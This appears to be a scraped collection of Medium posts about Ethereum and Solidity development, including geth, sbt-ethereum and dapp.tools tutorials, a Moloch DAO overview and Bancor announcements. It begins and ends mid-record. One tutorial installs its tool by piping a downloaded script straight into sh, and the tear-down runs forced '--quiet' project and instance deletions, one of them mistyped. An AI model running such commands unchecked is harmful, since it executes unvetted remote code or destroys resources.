case \u201c0xd54d35\u2026\u201d) corresponds to the hash presented to us from the changeCarOwner command. But, it has not yet been mined to a block because we paused mining.Flip to the CLI session and resume then promptly stop mining:> miner.start()> miner.stop()And back to the logging session:INFO [11-03|20:05:30] Starting mining operation INFO [11-03|20:05:30] Commit new mining work                   number=5601 txs=1 uncles=0 elapsed=594.603\u00b5sINFO [11-03|20:05:31] Successfully sealed new block            number=5601 hash=56e27d\u2026321305INFO [11-03|20:05:31] \ud83d\udd17 block reached canonical chain          number=5596 hash=f9d501\u2026a7b5d7INFO [11-03|20:05:31] \ud83d\udd28 mined potential block                  number=5601 hash=56e27d\u2026321305INFO [11-03|20:05:31] Commit new mining work                   number=5602 txs=0 uncles=0 elapsed=239.941\u00b5sAnd now, we should be able to get the update owner of CAR0:> browser_simple_sol_simple.queryCar(\"CAR0\")[\"Ford\", \"Daz\"]Lastly, let\u2019s:> browser_simple_sol_simple.createCar(\"CAR3\",\"Porsche\",\"Dreams\")\"0x4e4a96bea684f6bfa3a4675765d31b0ae50acee92ae923a9b6de379d14f27241\"> browser_simple_sol_simple.queryCar(\"CAR3\")[\"\", \"\"]> browser_simple_sol_simple.queryCar(\"CAR3\")[\"\", \"\"]You should know why this doesn\u2019t show the new car but you may not know why it returns a result. This is because Solidity Mapping objects have values for every (possibly) key regardless of whether the key has been explicitly added.> miner.start()null> browser_simple_sol_simple.queryCar(\"CAR3\")[\"\", \"\"]> browser_simple_sol_simple.queryCar(\"CAR3\")[\"Porsche\", \"Dreams\"]> miner.stop()trueDeploying the harder wayThere are 6 steps to deploying contracts to an Ethereum network:Install the Solidity compiler (solc)Compiling Solidity to JavaScriptLoading the JavaScript in the networkMunging (!) the JavaScriptDetermining the gas value to run the ContractRunning the ContractThe \u201cgas\u201d value is an internal unit of work. I believe (!) there\u2019s a fixed valuation between \u201cgas\u201d and Ethereum \u201cEther\u201d (the currency).Install the Solidity compiler (solc)http://solidity.readthedocs.io/en/develop/installing-solidity.htmlAnd on Linux the instructions are:sudo add-apt-repository ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install solcCompiling Solidity to JavaScriptFrom the 3rd (and as yet unused) ssh session on ethereum-01, create a file called \u201csimple.sol\u201d and paste the contents from above in to it.Run the following command:echo var contractContent = > simple.jssolc --combined-json abi,bin,interface simple.sol >> simple.jsThe creates a JavaScript program (simple.js) that encapsulates the Solidity Contract. The relevant pieces are added to a JavaScript object called \u201ccontractContent\u201d.Load the JavaScript into the networkSwitch to the CLI session and:> loadScript(\"simple.js\")trueOptional: If you wish:> contractContentMunging the JavaScript & Determining the gasValueThen:> var contractTemplate=web3.eth.contract(JSON.parse(contractContent.contracts[\"simple.sol:Simple\"].abi))undefined> var gasValue = eth.estimateGas({data:\"0x\"+contractContent.contracts[\"simple.sol:Simple\"].bin})undefined> gasValue763187The first command of these 3 is the only one that is necessary. The gasValue is interesting. When we used Remix, it provided a gasValue (in my case) of \u20184700000\u2019. The computed value here is \u2018763187\u2019 which is much lower. I\u2019d recommend using the value used by Remix (it worked). So:> gasValue=4700000Run the ContractThen:var simple = contractTemplate.new({  from: eth.accounts[0],  data: \"0x\" + contractContent.contracts[\"simple.sol:Simple\"].bin,  gas:gasValue},  function (e, contract) {    console.log(e, contract);    if (typeof contract.address !== 'undefined') {      console.log('Contract mined! address: ' + contract.address + 'transactionHash: ' + contract.transactionHash);    }  });This mirrors the web3deploy functionality and uses a boilerplate (anonymous) function that produces the \u201cContract mined!\u201d message.All being well, as before:Contract mined! address: 0x023ccb7d6475eb59ccafb4eed49d72caf77be111transactionHash: 0x48c1681b8acd3ad0cafdf7c5bb8e4070034661fc02f45672510744815b869248If you don\u2019t get this success message, you may need to start mining. Once you receive it, as before but now simply \u201csimple\u201d:> simple.queryCar(\"CAR0\")[\"Ford\", \"Tomoko\"]This is a distinct application and so you should not expect to see the Car Structs that you created previously but, we may recreate them:> simple.createCar(\"CAR3\",\"Porsche\",\"Dreams\")\"0x85ea30f48f3b4a7b9ec16d437d3550a950d8531b34bbb095de2387013da444dd\"> simple.queryCar(\"CAR3\")[\"\", \"\"]> miner.start()null> simple.queryCar(\"CAR3\")[\"\", \"\"]> simple.queryCar(\"CAR3\")[\"Porsche\", \"Dreams\"]> miner.stop()trueConclusionsEthereum is a compelling Blockchain offering. Solidity appears to be a good language in which to write Contracts although I\u2019ve been stymied by several issues and struggled with poor documentation.When having problems deploying Contracts, I tried using pyethapp instead of geth and tried to use the konradkonrad/docker-pyeth-cluster. I was unsuccessful with the Docker-based test network and gave up.Tear-downTo exit from the CLI session, type \u201cexit\u201dTo exit from the logging session, type \u201cCTRL-C\u201d:INFO [11-03|20:36:37] Got interrupt, shutting down... INFO [11-03|20:36:37] IPC endpoint closed: /home/dazwilkin/Library/Ethereum/geth.ipc INFO [11-03|20:36:37] Blockchain manager stopped INFO [11-03|20:36:37] Stopping Ethereum protocol INFO [11-03|20:36:37] Ethereum protocol stopped INFO [11-03|20:36:37] Transaction pool stopped INFO [11-03|20:36:37] Database closed                          database=/tmp/ethereum_dev_mode/geth/chaindataINFO [11-03|20:36:37] whisper stoppedYou may \u201cexit\u201d from all the ssh sessions.You should be returned to your host session. The one from which you ran the gcloud commands. You may either stop the ethereum-01 VM:gcloud compute instances stop ${INSTANCE} \\--zone=${ZONE} \\--project=${PROJECT}Or (permanently) delete it:gcloud compute instances delete $(INSTANCE} \\--zone=${ZONE} \\--project=${PROJECT}--quietOr simply delete the entire GCP project:gcloud alpha projects delete ${PROJECT} --quiet", "responses": 0, "tags": ["Ethereum", "Solidity", "Google Cloud Platform", "Compute Engine"]}, {"title": "Creating Ethereum Smart Contracts via Command Line", "post_link": "https://medium.com/quiknode/creating-ethereum-smart-contracts-via-command-line-e817aa4ef8a?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-05-16", "last_modified_date": "2019-05-16", "readtime": "4.37", "claps": 4, "voters": 2, "content": "Photo by Shahadat Shemul on UnsplashCreating Ethereum Smart Contracts via Command LineAn interactive command line alternative for your favorite Smart Contract development tool (like Truffle!)Gaurav AgrawalFollowMay 16 \u00b7 5 min readIn last week\u2019s article, we talked about how to interact with an already-deployed Smart Contract using sbt-ethereum. This week we are going to create a Smart Contract using sbt-ethereum!sbt-ethereum not only allows you to create Smart Contracts, but also helps you manage your web3 projects (like one would with Truffle), though sbt\u2019s rich command line tool. (it just makes your life easier as a web3 developer!)If you just stumbled upon this article, we strongly recommend you check the previous part of this series.Part 1- sbt-ethereum \u2014 A Tool for Interacting with the Ethereum Blockchain via Command LinePart 2- Interact with Smart Contracts using the Command LineBefore diving in, we need to install a few things (if you don\u2019t have them already):Install Java (version \u2265 8 )Install GitInstall Maven (Maven is dependency management for Java ecosystem; what is npm in nodejs, maven is for Java ecosystem)Once installed we are ready to dive in \ud83d\udc49In previous tutorials, we\u2019ve run sbt by executing the ./sbtw wrapper script within the eth-command-line repository. This time, we need to create our own repository.To get sbt-ethereum project\u2019s template, we will use giter8. Giter8 is a command line tool to generate files and directories from templates published on Github or any other git repository. Giter8 helps us by scaffolding projects based on a pre-defined template.Use this command to create a project repository:sbt new swaldman/solidity-seed.g8As sbt-ethereum is an interactive build tool, this command will ask a few questions:[info] Loading project definition from /Users/testuser/project[info] Set current project to testuser (in build file:/Users/testuser/)A minimal solidity project for sbt-ethereum name [my-solidity-project]: eth-timelockversion [0.0.1-SNAPSHOT]: sbt_ethereum_version [0.1.7-SNAPSHOT]: sbt_version [1.2.8]: Template applied in ./eth-timelockThis will create a new eth-timelock directory (see above, we have given eth-timelock as a project name). This is how the directory structure looks like:Now we are ready to create our first contract. Remember, create all contracts under src/main/solidity .We are going to create Timelock contract. It accepts payment of ETH when the contract is created, and only allows that ETH to be withdrawn by the creator of the contract after a specified delay.Create a Timelock.sol file under src/main/solidityTimelock.solNow let's compile our project.First, run sbt inside your eth-timelock directory:$ sbt[info] Loading settings for project eth-timelock from build.sbt ...[info] Set current project to eth-timelock (in build file:/Users/testuser/eth-timelock/)[info] Updating available solidity compiler set.[info] sbt-ethereum-0.1.7-SNAPSHOT successfully initialized (built Sun, 17 Feb 2019 21:58:11 -0800)Next run compile :sbt:eth-timelock> compile[info] Compiling 1 Solidity source to /Users/testuser/eth-timelock/target/ethereum/solidity...[info] Compiling 'Timelock.sol'. (Debug source: '/Users/testuser/eth-timelock/target/ethereum/solidity/Timelock.sol')[info] No Scala stubs will be generated as the setting 'ethcfgScalaStubsPackage' has not ben set.[info] If you'd like Scala stubs to be generated, please define 'ethcfgScalaStubsPackage'.[info] Updating ...[info] Done updating.[success] Total time: 1 s, completed Feb 25, 2019 12:16:01 AMIf you see any warning, just ignore it. You can see ABI get created under /target/ethereum/solidity .Now we are ready to deploy our Smart Contract. But before that, if you want to switch the network, you can like this:First, check your network with ethNodeChainIdPrint . sbt-etherum has MainNet set by default. Let\u2019s change it to Ropsten (if you want some other testnet, feel free to do so too).ethNodeChainIdOverrideSet 3Here, 3 is the Ropsten network id. Remember, you should have a bit of ETH in your account to deploy the contract.Now let\u2019s start deploying:sbt:eth-timelock> ethTransactionDeploy Timelock <TAB>Always use Tab, sbt-ethereum has very rich Tab support for command completion. When you press Tab, it will tell you what to do next.Our Smart Contract will need two parameters:days \u2014 The number of days when the owner will be able to withdraw Ether.seconds \u2014 Number of seconds when the owner will be able to withdraw Ether.We\u2019ll need the Smart Contract\u2019s compute time using days + seconds, so let\u2019s pass 0 days and 300 seconds (5 minutes):ethTransactionDeploy Timelock 0 300 <TAB>Now we need to pass the Ether amount, which will lock the contract for the given time. You can pass ETH amount using wei, gwei, szabo, finney, or ether units.Let\u2019s lock 10 wei for 5 minutes (300 seconds):ethTransactionDeploy Timelock 0 300 10 weiThis will ask you to unlock your wallet using your passphrase and then ask you to submit the transaction. It will also ask to provide an alias name for your deployed contract.Once done, it will give you deployed contract address which you can see on Etherscan. Let check the balance of the contract using:ethAddressBalance timelockHere timelock is alias name which we used while deploying our contract.Interacting with your Smart ContractNow, before 5 minutes runs out, let\u2019s mock-test our Smart Contract using ethTransactionMock. This simulates a transaction on our Ethereum Node, but does not actually execute the transaction. So let\u2019s try that:sbt:eth-timelock> ethTransactionMock timelock withdrawIf you execute this within 5 minutes of deploying the Smart Contract, you will see an error. Execute the above command after 5 minutes and you will see a success message, but it does not run the command actually.Now let\u2019s actually withdraw our 10 wei from the contract after 5 minutes using:ethTransactionInvoke timelock withdrawThis will create a transaction and withdraw the locked 10 wei. Once this command succeeds, you can check the balance of the contract again:ethAddressBalance timelockConclusionThat\u2019s it for today! Now you have another way to #buidl and deploy Smart Contracts. Let us know if you liked the article in the comment section and if you want to see more on this (or similar) topic \ud83d\ude4fAbout QuikNodeQuikNode is building infrastructure to support the future of Web3. Since 2017, we\u2019ve worked with hundreds of developers & companies, helping scale dApps and providing high-performance Ethereum nodes. We\u2019re working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Blockchain", "Web3"]}, {"title": "Ethereum VM and DSLs for Smart Contracts (2015)", "post_link": "https://blog.reverse.vc/ethereum-vm-and-dsls-for-smart-contracts-2015-52ec52eafbed?source=search_post", "author_name": "Zvi Avraham", "author_link": "https://blog.reverse.vc/@nivertech", "publish_date": "2017-09-02", "last_modified_date": "2018-03-06", "readtime": "0.07", "claps": 2, "voters": 2, "content": "Ethereum VM and DSLs for Smart Contracts (2015)Zvi AvrahamFollowSep 2, 2017 \u00b7 1 min readMy 2.5-years old presentation about Bitcoin, Smart Contracts and EthereumEthereum VM and DSLs for Smart Contracts (2015)", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Dsl", "Domain Specific Languages"]}, {"title": "", "post_link": "https://medium.com/@vaibhavsaini_67863/before-answering-your-question-let-me-make-one-thing-clear-explained-below-1b9d24c4157e?source=search_post", "author_name": "vasa", "author_link": "https://medium.com/@vaibhavsaini_67863", "publish_date": "2018-12-13", "last_modified_date": "2018-12-13", "readtime": "0.68", "claps": 12, "voters": 2, "content": "Thank you for this very complete list.101Benoit RogniervasaFollowDec 13, 2018 \u00b7 1 min readHi Benoit Rognier!Before answering your question, let me make one thing clear(explained below).Actually, most(maybe all) of the platforms who display themselves as \u201cTuring Complete\u201d are not actually turing complete.Take the example of Ethereum. The programming language used, Solidity, is a turing complete language; but when you see the whole architecture(EVM), it\u2019s not turing complete. This is because Ethereum uses gas in order to limit the operations and memory usage while executing any transaction on the network.Each block has a gas limit(gas limit was around 8000000 around May 2018). So, as a block is made up of transactions, each transaction has some gas limit. So, a transaction can only do a limited amount of computations/memory consumption. Thus the system as a whole is not \u201cTuring complete\u201d, even if the underlying language is Turing complete.Coming back to your question, \u201cTuring completeness\u201d of the language provides you the flexibility of implementing any business logic; but on the other hand it also limits(using EVM architecture) that feature to counter the problems which come along with it(difficulty in formally verifying the program).", "responses": 0, "tags": ["Evm", "Smart Contracts", "Solidity", "Solidity Turing Complete", "Gas Limit"]}, {"title": "The Ether Review #41 \u2014 Martin Lundfall, Rage Against the Machine", "post_link": "https://media.consensys.net/the-ether-review-41-martin-lundfall-rage-against-the-machine-74e5e7a791e1?source=search_post", "author_name": "ConsenSys", "author_link": "https://media.consensys.net/@ConsenSys", "publish_date": "2016-09-09", "last_modified_date": "2018-05-24", "readtime": "0.55", "claps": 0, "voters": 0, "content": "The Ether Review #41 \u2014 Martin Lundfall, Rage Against the MachineConsenSysFollowSep 9, 2016 \u00b7 1 min readWhat is the Ethereum Virtual Machine, what design trends and decisions influence its operation and what does that mean for Ethereum the platform?Today we dive deep. There is a debate around whether the flexibility of the imperative paradigm of programming language design or the verifiability of the functional paradigm are more appropriate for the Ethereum Virtual Machine. Martin is in the functional camp which he believes can make Ethereum a more robust and powerful platform. The EVM itself is often overlooked as a black box, but is one of a tripartite of technologies including the consensus mechanism and the distributed ledger, whose design is interdependent. Exploring the relationship between these components is an interesting way to gain a deeper understanding of everyone\u2019s favorite world computer.Content: Martin Lundfall, Arthur FallsSubscribe on iTunes or Soundcloud", "responses": 0, "tags": ["The Ether Review Podcast", "Ethereum", "Solidity", "Blockchain", "Functional Programming"]}, {"title": "Moloch DAO", "post_link": "https://medium.com/play-project/moloch-is-a-grant-making-dao-guild-and-a-radical-experiment-in-voluntary-incentive-alignment-to-ab195ff38503?source=search_post", "author_name": "Nina Breznik", "author_link": "https://medium.com/@ninabreznik", "publish_date": "2019-06-28", "last_modified_date": "2019-06-28", "readtime": "2.34", "claps": 22, "voters": 1, "content": "Moloch DAONina BreznikFollowJun 28 \u00b7 3 min readis a grant-making DAO / Guild and a radical experiment in voluntary incentive alignment to overcome the \u201ctragedy of the commons\u201d.Moloch is described by two smart contracts:Moloch.sol - Responsible for managing membership & voting rights, proposal submissions, voting, and processing proposals based on the outcomes of the votes.To try out Moloch smart contract, copy the source code and paste it into https://playproject.io/editor-solidity/GuildBank.sol - Responsible for managing Guild assets.Copy Guildbank source code and paste it into online solidity editor https://playproject.io/editor-solidity/Moloch has a native asset called shares. Shares are minted and assigned when a new member is accepted into the Guild and provide voting rights on new membership proposals. They are non-transferrable, but can be irreversibly redeemed at any time to collect a proportional share of all ETH held by the Guild in the Guild Bank.Moloch operates through the submission, voting on, and processing of a series of membership proposals. To combat spam, new membership proposals can only be submitted by existing members and require a 10 ETH deposit. Applicants who wish to join must find a Guild member to champion their proposal and have that member call submitProposal on their behalf. The membership proposal includes the number of shares the applicant is requesting, and either the amount of ETH the applicant is offering as tribute or a pledge that the applicant will complete some work that benefits the Guild.All ETH offered as tribute is held in escrow by the Moloch.sol contract until the proposal vote is completed and processed. If a proposal vote passes, the applicant becomes a member, the shares requested are minted and assigned to them, and their tribute ETH is deposited into the GuildBank.sol contract. If a proposal vote is rejected, all tribute ETH is returned to the applicant. In either case, the 10 ETH deposit is returned to the member who submitted the proposal.Proposals are voted on in the order they are submitted. The voting period for each proposal is 7 days. During the voting period, members can vote (only once, no redos) on a proposal by calling submitVote. There can be 5 proposals per day, so there can be a maximum of 35 proposals being voted on at any time (staggered by 4.8 hours). Proposal votes are determined by simple majority of votes cast on the proposal, with no quorum requirement.At the end of the voting period, proposals enter into a 7 day grace period before the proposal is processed. The grace period gives members who voted No or didn\u2019t vote the opportunity to exit by calling the ragequit function and witdrawing their proportional share of ETH from the Guild Bank. Members who voted Yes must remain until the grace period expires and the proposal is processed, but only if the proposal passed. If the proposal failed, members who voted Yes can ragequit as well.At the end of the grace period, proposals are processed when anyone calls processProposal. A 0.1 ETH reward is deducted from the proposal deposit and sent to the account to the address which calls processProposal.For more information about Moloch, visit their repo. To try out their smart contract source code, open Play solidity editor and paste in the GuildBank.sol or Moloch.sol.Links:https://github.com/MolochVentureshttps://playproject.io/editor-solidity", "responses": 0, "tags": ["Ethereum", "Moloch", "Moloch Dao", "Solidity", "Playeditor"]}, {"title": "Use dapp.tools for Ethereum Contract Development", "post_link": "https://medium.com/coinmonks/use-dapp-tools-for-ethereum-contract-development-2775d8b2ba0?source=search_post", "author_name": "KC Tam", "author_link": "https://medium.com/@kctheservant", "publish_date": "2019-05-16", "last_modified_date": "2019-05-20", "readtime": "7.08", "claps": 11, "voters": 1, "content": "Use dapp.tools for Ethereum Contract DevelopmentKC TamFollowMay 16 \u00b7 8 min readIntroductionWhen developing and testing Solidity contract, I believe most people are using Remix, an online IDE (integrated development environment) everyone can use through a browser. Remix comes with editor, terminal, compiler and runtime environment, on either a built-in Ethereum simulator or an external Ethereum network.Because of a new project I got a chance to use a toolset from dapp.tools, and find almost a command-line equivalent to Remix running in my localhost. I find it very intuitive. Also dapp.tools come with some packages that I can easily incorporate into my contract.Here in this article I first show some basic functions and operation of dapp.tools, I will use a simple contract code and see how to create unit test on the contract itself, ensuring the logic defined in the contract is exactly what is expected in the test case. After that I deploy the contract and interact it with an Ethereum simulation, testnet, which is also from dapp.tools. In the next article I will create another contract and see how to incorporate pre-built token package into my project.dapp.tools Overview and InstallationThe best introduction for dapp.tools is in their page.As described by their site, dapp.tools is a set of \u201ccommand-line-friendly tools for blockchain development\u201d. As a quick overview, dapp.tools come with several handy tools for Ethereum contract development. Again you can see the best description on those tools and the description in their website.In my demonstration I will use dapp to perform unit test of my contract code and deploy it in the testnet provided by dapp.tools. After that i will use seth to interact with my deployed contract.The installation is quite straight-forward. As I am using Mac I simply follow their instruction.curl https://dapp.tools/install | shInitialize a WorkspaceThe first thing of our demonstration is to initialize a workspace for dapp, using dapp init.mkdir simplestoragecd simplestoragedapp initFrom the output we learn that, after dapp init, we havea directory structure created, with directory src keeping our contract code and test code, and directory lib for the packages.inside src, there are two files created: Simplestorage.sol is for our contract code, and Simplestorage.t.sol is for the test code. They are both prepopulated with basic contract structure.inside lib, a package ds-test is installed. This is the package for testing our contract.A sanity test is performed.A git repository is created for this workspace.Here is the directory structure after dapp init.Directory structure created by dapp initContract Code and Test CodeNow let\u2019s prepare the contract code and the test code.Here I am using the famous Simple Storage contract code. This contract keeps a stored value when it is first deployed. And we can use the two functions to interact with the contract: get() for the stored value, and set(x) to update the value.The workspace initialization creates an empty contract using the workspace directory name: src/Simplestorage.sol. We simply copy this contract code in this file.pragma solidity ^0.5.6;contract Simplestorage { uint storedData;function set(uint x) public {  storedData = x; }function get() view public returns (uint retVal) {  return storedData; }}The workspace initialization also creates a test contract of the name, with extension t.sol: src/Simplestorage.t.sol. We simply copy the test code in this file. While it comes with two sample tests.pragma solidity ^0.5.6;import \"ds-test/test.sol\";import \"./Simplestorage.sol\";contract SimplestorageTest is DSTest {    Simplestorage simplestorage;function setUp() public {        simplestorage = new Simplestorage();    }function testGetInitialValue() public {        assertTrue(simplestorage.get() == 0);    }function testSetValue() public {        uint x = 300;        simplestorage.set(x);        assertTrue(simplestorage.get() == 300);    }}Let\u2019s take a look on this test contract. Simplestorage.t.sol is also a Solidity contract. It first imports the test.sol inds-test package (installed during workspace initialization) and the Simplestorage.sol contract.We are defining our test cases as functions. Before that we need a setUp() function to deploy this contract.Functions for test cases are named with prefix test. Each of these functions will be performed as test item. Test is passed only when condition in assertTrue(condition) is true. Function testGetInitialValue() is to get the stored value with get() function after contract deployment. Function testSetValue() is to check whether set(x) can be used for a new value and check the value with get() function.You may ask where the test is running. Dapp test uses a Hevm, their own EVM implementation good for testing and debugging. Therefore we do not need to run any testnet for the contract testing.Test Contract CodeAs said, we do not need a testnet for contract testing. Here we use command dapp test for unit test.dapp testDapp will search those contract with t.sol extension, and execute setUp() and all functions with prefix test: in our test code there are two functions: testGetInitialValue() and testSetValue().Here are the result.From the result we see dapp test first compile the two contracts. After that, the two test cases inside Simplestorage.t.sol are run and successfully passed.Meanwhile the compiled result is stored in directory out. We can find all the artifacts after compilation in this directory.Run TestnetNow our contract is ready for deployment. We will first run the testnet, an Ethereum network provided by dapp.Use a different terminal to run the testnetdapp testnetUse another terminal to run testnetSome observation on running dapp testnetAll the testnet setup is in my home directory, under ~/.dapp/testnet/8545.If we take a look on this directory, we see the geth component and other setup.Inside keystore directory we will have the coinbase account setup. The address is also shown in the testnet screen (here it is 0x62a8\u2026c362, and this address is different every time when we run dapp testnet.)The testnet is in fact a running geth with genesis block and coinbase key kept in this directory.Here is the directory structure of the testnet.Deploy ContractWith a terminal with dapp testnet running, we are ready to deploy the contract.We first specify the coinbase address we are using for contract deployment and tell where to get the private key. It is done through setting environment variables ETH_FROM and ETH_KEYSTORE.export ETH_FROM=0x62a872619c4072f73724d0fb5905354fc6ecc362export ETH_KEYSTORE=~/.dapp/testnet/8545/keystoreWe use dapp create to deploy the contract. When prompted for passphrase, it is empty for testnet.dapp create SimplestorageAs we see a transaction is executed. This is the contract deployment.Note we will get back an address (0x9fa2\u20267fde). It is the contract ID (or contract address) after deployment. For easy access we will define another environment variable SIMSTO to keep this value.export SIMSTO=0x9fa245ee3daa5314fdfe33124b9215029c157fdeNow the contract is deployed, and we are ready to interact with it.Interacting with ContractTo interact with contract we are using seth. Seth is the Ethereum client made in command line. We can perform many tasks with seth. Here we just use it for executing functions in the deployed contract.First we will use seth call for function get() for those functions without updating the blockchain. What we need is the deployed contract ID (the environment variables we set in previous step).seth call $SIMSTO \u201cget()\u201dAs expected, the value is initially zero.We will set a new value. For functions requiring arguments, we place the argument list after the function. Also seth requires hex input and we will use seth --to-uint256 to convert the number into hex and fitting to 256-bit.We will use seth send for functions updating blockchain.seth send $SIMSTO \u201cset(uint)\u201d $(seth --to-uint256 100)The first command is just to show a conversion of number to uint256We see a new transaction is created, and the transaction is included in a new block.Finally we check the stored value again with get().seth call $SIMSTO \u201cget()\u201dThe result is 0x64 (100), as expected.Clean-UpAnd after we complete our demonstration or testing, we can stop the dapp testnet terminal by control-c. The directory for testnet, i.e. ~/.dapp/testnet/8545 will be emptied. All information in testnet, including the account and the block created during the test, are gone. This helps a lot as we do not need to delete files in various directories.After testnet is stopped, all files in this directory are gone.Side Node: Deploy Contract in Public EthereumThe default setup for seth is going to local RPC, which is the local testnet.If we wish to deploy our contract in public Ethereum networks, what we need is to let seth knows the target network through environment variables.The variables we need areexport SETH_CHAIN=<the chain you are deploying, e.g. mainnet, rinkeby, etc>export ETH_KEYSTORE=<your keystore in the Ethereum network>export ETH_FROM=<your coinbase address in this Ethereum network>Then all commands from seth will go to the Ethereum network you specify. Make sure you have ethers on the network in your account for gas.ClosingWe just show how to perform unit test for an Ethereum contract using dapp tools. We also deploy a testnet and use seth to execute functions for a deployed contract.This only shows the very basic functionality of dapp tools. In the next article I will create a bigger contract, and see how to incorporate ds-token package to make token useable in my contract.", "responses": 0, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Solidity", "Dapps"]}, {"title": "More like this", "post_link": "https://medium.com/robhitchens/more-like-this-cbf164f1aba3?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2019-03-19", "last_modified_date": "2019-03-26", "readtime": "0.60", "claps": 0, "voters": 0, "content": "More like thisRob HitchensFollowMar 19 \u00b7 1 min readStories by Rob Hitchens around the web.Unpacking the Ethereum Stack for DevelopersThe Solidity Withdrawal PatternIs it too late to get into blockchain?Storage Pointers in SolidityGetting Loopy with SolidityCalls vs. transactions In Ethereum smart contractsB9lab on the Zero Knowledge PodcastThe Joy of Minimalism in Smart Contract DesignBinary Search Trees and Order Statistics in Solidity for EthereumEthereum StackExchangePhoto by Maxim Du\u017eij on UnsplashRob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 0, "tags": ["Ethereum Blockchain", "Ethereum", "Solidity", "Solidity Tutorial", "Solidity Language"]}, {"title": "Le Protocole Bancor", "post_link": "https://medium.com/the-bancor-protocol-french/le-protocole-bancor-6747e94678a1?source=search_post", "author_name": "Bancor", "author_link": "https://medium.com/@bancor", "publish_date": "2017-07-13", "last_modified_date": "2017-07-26", "readtime": "2.26", "claps": 0, "voters": 0, "content": "Le Protocole BancorBancorFollowJul 13, 2017 \u00b7 3 min readBonjour tout le monde, nous sommes l\u2019\u00e9quipe \u00e0 l\u2019origine du Protocole de Bancor (PDF) et nous construisons un syst\u00e8me mon\u00e9taire hi\u00e9rarchique et d\u00e9centralis\u00e9, sur la blockchain.Lorsque l\u2019on analyse le monde des \u00e9changes entre personnes, on peut distinguer deux grands ensembles de choses que nous partageons et \u00e9changeons \u2014 des informations et de la valeur. Alors que l\u2019information (compos\u00e9e de contenus tels des textes, images, vid\u00e9os, etc.) est par nature reproductible (lorsque vous la partagez, l\u2019autre personne et vous-m\u00eame en \u00eates chacun d\u00e9tenteurs), la valeur \u00e0 l\u2019inverse ne l\u2019est pas (lorsque vous la transmettez \u00e0 quelqu\u2019un, alors vous ne la d\u00e9tenez plus.)Avant l\u2019\u00e8re d\u2019Internet, les r\u00e9seaux d\u2019information priv\u00e9s \u00e9taient nombreux, ce dont les plus vieux d\u2019entre-nous peuvent se rappeler, comme BBS, Prodigy, Compuserve, AoL, pour n\u2019en citer que quelques exemples. La mont\u00e9e d\u2019un Internet public a tout chang\u00e9 et ceux qui ont surv\u00e9cu ont alors adopt\u00e9 la nouvelle norme mondiale ouverte pour l\u2019\u00e9change d\u2019informations, qui repose sur une collection de r\u00e9seaux TCP/IP, qui sont reli\u00e9s par des accords d\u2019\u00e9change de trafic (peering agreements).Jusqu\u2019\u00e0 la Blockchain, toutes les devises repr\u00e9sentant de la valeur vivaient dans des silos cloisonn\u00e9s. La Blockchain, la technologie d\u00e9velopp\u00e9e par le Bitcoin, est un r\u00e9seau d\u2019\u00e9change de valeur d\u00e9centralis\u00e9, l\u2019Internet de l\u2019argent. Il finira un jour ou l\u2019autre par remplacer une grande partie des r\u00e9seaux de banques priv\u00e9es actuels, et permettra aux nouveaux acteurs (et aux anciens qui se seront adapt\u00e9s) de cr\u00e9er de nouveaux types de valeur, en traitant dans un syst\u00e8me ouvert et global n\u2019\u00e9tant plus la propri\u00e9t\u00e9 de quiconque.L\u2019\u00e9quipe Bancor d\u00e9veloppe des produits bas\u00e9s sur Internet depuis la fin des ann\u00e9es 90. Contact Networks, MetaCafe, Mytopia, Particle Code et AppCoin sont quelques-unes des soci\u00e9t\u00e9s dont nous sommes \u00e0 l\u2019origine. Nous sommes tomb\u00e9s sur le Bitcoin en 2011, et avons commenc\u00e9 \u00e0 en explorer les possibilit\u00e9s concernant les devises g\u00e9n\u00e9r\u00e9es par les utilisateurs. Suite au lancement d\u2019Ethereum en 2015, nous avons compris que les smart contracts allaient changer la donne, et permettraient la cr\u00e9ation et la personnalisation de monnaie \u00e0 plus grande \u00e9chelle. Les modules programmables g\u00e9rant la valeur et la conservant (repr\u00e9sent\u00e9s sous forme de jetons) peuvent effectuer des processus li\u00e9s \u00e0 la valeur, et ceci \u00e0 moindre co\u00fbt \u2014 ces processus sont actuellement g\u00e9r\u00e9s par diverses organisations (services de d\u00e9p\u00f4t fiduciaires, bourses d\u2019\u00e9change, cabinets d\u2019avocats, pour n\u2019en nommer que quelques-uns). Cependant, les implications d\u2019un code d\u00e9centralis\u00e9 et autonome pouvant g\u00e9rer l\u2019argent digital via un standard libre d\u00e9di\u00e9 \u00e0 l\u2019\u00e9change de valeur sont beaucoup plus profondes.Au cours de l\u2019\u00e9t\u00e9 2016, nous avons commenc\u00e9 \u00e0 travailler sur Bancor dans le but de cr\u00e9er un syst\u00e8me mon\u00e9taire hi\u00e9rarchique (o\u00f9 un token digital d\u00e9tient d\u2019autres tokens dans sa r\u00e9serve), afin de construire un nouveau standard pour les crypto-monnaies, qui jetterait les bases d\u2019un syst\u00e8me d\u2019\u00e9change global d\u00e9centralis\u00e9. Un syst\u00e8me autonome sans \u00e9carts de prix achat/vente, ni aucun risque de contrepartie, et fournissant une liquidit\u00e9 continue pour tout actif. Un syst\u00e8me permettant la longue tra\u00eene des devises, \u00e0 l\u2019image de ce qu\u2019Internet a permis pour le contenu.Nous aimerions partager avec vous, l\u2019Internet, notre Whitepaper du projet que nous soumettons \u00e0 votre appr\u00e9ciation et \u00e0 vos commentaires. Tout retour et commentaire de votre part est le bienvenu et tr\u00e8s appr\u00e9ci\u00e9.L\u2019\u00e9quipe Bancorhttp://bancor.network", "responses": 0, "tags": ["Bitcoin", "Blockchain", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "Protocollo Bancor", "post_link": "https://medium.com/il-protocollo-bancor/protocollo-bancor-9fac4b0a6bd2?source=search_post", "author_name": "Bancor", "author_link": "https://medium.com/@bancor", "publish_date": "2017-07-13", "last_modified_date": "2018-05-11", "readtime": "2.00", "claps": 0, "voters": 0, "content": 